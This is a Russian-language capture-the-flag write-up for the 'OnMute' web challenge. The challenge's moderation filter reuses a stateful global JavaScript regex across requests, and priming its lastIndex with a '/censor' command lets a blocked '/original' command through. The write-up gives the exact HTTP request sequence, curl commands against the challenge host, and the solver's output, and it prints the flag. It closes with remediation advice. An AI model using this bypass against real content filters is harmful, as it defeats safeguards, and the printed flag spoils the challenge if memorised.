# OnMute — технический разбор

**Флаг:** `avito{REg3X_FOr_51lENCE_5laSh_G_FOr_V10LENc3}`
**Класс:** web / source review / stateful regular expression bypass

## Краткое техническое резюме

Moderation layer переиспользует один JavaScript `RegExp` с флагом `g` между двумя code paths.
Состояние `lastIndex` сохраняется в session-scoped cache. Команда `/censor` позволяет установить
ненулевой `lastIndex`, после чего проверка `/original 4` начинается с этого offset и пропускает
запрещённый token в начале строки.

Два последовательных request в одной session создают deterministic filter bypass и возвращают
нецензурированный текст трека с флагом.

---

## 1. Контекст и цель

OnMute публикует censored lyrics. Исходный archive `onmute_a003aa0.zip` содержит Node.js/Express
backend, Redis storage и React frontend. В `seed.js` каждый track имеет поля `censored` и `original`,
но обычные API routes возвращают только `censored`.

Единственный reachable path к `getOriginalText(id)` — bot command:

```text
/original <track_id>
```

Команда отправляется через:

```http
POST /api/tracks/:id/comment
Content-Type: application/json

{"text":"/original 4"}
```

Token `/original` находится первым в `BLOCKED_WORDS`, поэтому direct request блокируется moderation
layer.

## 2. Reconnaissance и attack surface

`moderation/filter.js` компилирует один global regular expression из blocklist. Один и тот же
instance используется функциями:

- `checkContent` — iteration через `RegExp.prototype.exec`;
- `matchesPolicy` — single check через `RegExp.prototype.test`;
- cache key — текущий `sessionId`.

JavaScript `RegExp` с flags `g` или `y` является stateful: успешные `exec` и `test` обновляют
`lastIndex`. Неуспешный поиск сбрасывает `lastIndex` в ноль, но успешный `test` оставляет offset после
match.

Команда `/censor <start> <end>` сначала проходит `checkContent` по собственному command text, а затем
вызывает `matchesPolicy` для `track.text.slice(start, end)`. Таким образом, один request может
установить `lastIndex` на основании другого input buffer.

## 3. Анализ и проверка гипотез

### 3.1. Priming shared regex state

В censored text трека 1 слово `массаж` расположено на offsets `[617:623]` и входит в blocklist.
Отправляется команда:

```http
POST /api/tracks/1/comment
Content-Type: application/json

{"text":"/censor 617 623"}
```

Внутренний вызов выполняет:

```javascript
regex.test("массаж") === true
regex.lastIndex === 6
```

Session-scoped regex instance сохраняет `lastIndex = 6` после завершения request.

### 3.2. Moderation bypass

Следующий request должен использовать ту же cookie `onmute_sid` и выполняться без промежуточных
moderation checks:

```http
POST /api/tracks/4/comment
Content-Type: application/json

{"text":"/original 4"}
```

`checkContent` начинает поиск с offset 6. Token `/original` расположен в начале строки и остаётся до
текущей search position, поэтому regex не обнаруживает match. Command dispatcher после успешной
moderation вызывает `getOriginalText(4)`.

Track ID в URL не определяет аргумент `/original`; критичны только общая session и порядок requests.

## 4. Корневая причина

Root cause — shared mutable state в security validation component:

1. global `RegExp` сохраняет `lastIndex` между вызовами;
2. один instance используется для `test` и `exec` на разных strings;
3. instance кэшируется между HTTP requests по session ID;
4. validator не устанавливает `lastIndex = 0` перед каждой проверкой.

В результате результат moderation зависит от предыдущего user-controlled request. Это создаёт
cross-request state confusion и позволяет обходить blocklist детерминированным priming operation.

## 5. Эксплуатация

### 5.1. Минимальный HTTP sequence

```bash
curl -s -c jar \
  https://onmute-xtegmx4v.avitoctf.ru/api/tracks/1/comment \
  -H 'Content-Type: application/json' \
  -d '{"text":"/censor 617 623"}'

curl -s -b jar \
  https://onmute-xtegmx4v.avitoctf.ru/api/tracks/4/comment \
  -H 'Content-Type: application/json' \
  -d '{"text":"/original 4"}'
```

### 5.2. Автоматизированный solver

`task5/solve_task5.py` получает censored text через API, динамически находит offsets слова `массаж`,
выполняет priming и отправляет `/original 4` в той же session:

```bash
uv run python task5/solve_task5.py
```

Ожидаемый результат:

```text
[prime] 'массаж' at [617:623] in track 1
[bypass] POST /original 4 -> HTTP 200
FLAG: avito{REg3X_FOr_51lENCE_5laSh_G_FOr_V10LENc3}
```

## 6. Флаг

```text
avito{REg3X_FOr_51lENCE_5laSh_G_FOr_V10LENc3}
```

## 7. Выводы и рекомендации

- Security validators должны быть stateless относительно предыдущих requests.
- Для global/sticky regex необходимо создавать новый instance на каждую validation либо явно
  устанавливать `lastIndex = 0` до вызова.
- Нельзя смешивать `test` и `exec` на shared regex без строгого управления state.
- Session-scoped caches должны хранить immutable configuration, а не mutable parser objects.
- Unit tests moderation layer должны включать ordered request sequences, потому что single-call tests
  не обнаруживают cross-request state confusion.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task5/solve_task5.py` — end-to-end exploit с динамическим поиском priming substring.

Исходный challenge archive ожидается в `task5/onmute_a003aa0.zip` и не входит в
version-controlled набор.
